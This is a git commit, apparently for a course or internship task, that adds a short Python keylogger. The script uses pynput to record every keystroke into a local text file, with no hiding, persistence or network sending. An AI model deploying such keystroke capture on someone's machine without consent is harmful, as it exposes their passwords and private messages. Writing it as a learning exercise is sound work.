4a01f5bc5d081fa71c888facd020b4abc15b082e
Navdeep Sharma <navdeepsharma1001@gmail.com>
2025-06-27 21:33:35 +0530

    Add files via upload

---
+++ Task-04/keylogger.py
@@ -0,0 +1,15 @@
+from pynput import keyboard
+
+log_file = "keylog.txt"
+
+def on_press(key):
+    try:
+        with open(log_file, "a") as f:
+            f.write(f"{key.char}")
+    except AttributeError:
+        with open(log_file, "a") as f:
+            f.write(f" [{key}] ")
+
+# Listener
+with keyboard.Listener(on_press=on_press) as listener:
+    listener.join()
